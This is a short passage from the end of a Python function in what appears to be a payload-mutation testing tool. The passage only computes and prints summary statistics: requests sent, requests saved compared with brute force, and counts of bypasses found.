                time.sleep(tester.delay)

        results.extend(mutation_results)

    # ── Stats ────────────────────────────────────────────────────────────
    stats.requests_saved = stats.total_payloads_available - (stats.probes_sent + stats.payloads_tested + stats.mutations_tested)

    if verbose:
        print(f"\n  \033[1mEvolution Summary\033[0m")
        print(f"    Requests: {stats.probes_sent + stats.payloads_tested + stats.mutations_tested} "
              f"(vs {stats.total_payloads_available} brute-force)")
        print(f"    Saved: {stats.requests_saved} requests ({stats.efficiency_gain}% reduction)")
        print(f"    Bypasses: {stats.bypasses_found} from payloads + {stats.mutations_bypassed} from mutations")

    return results, stats, profile
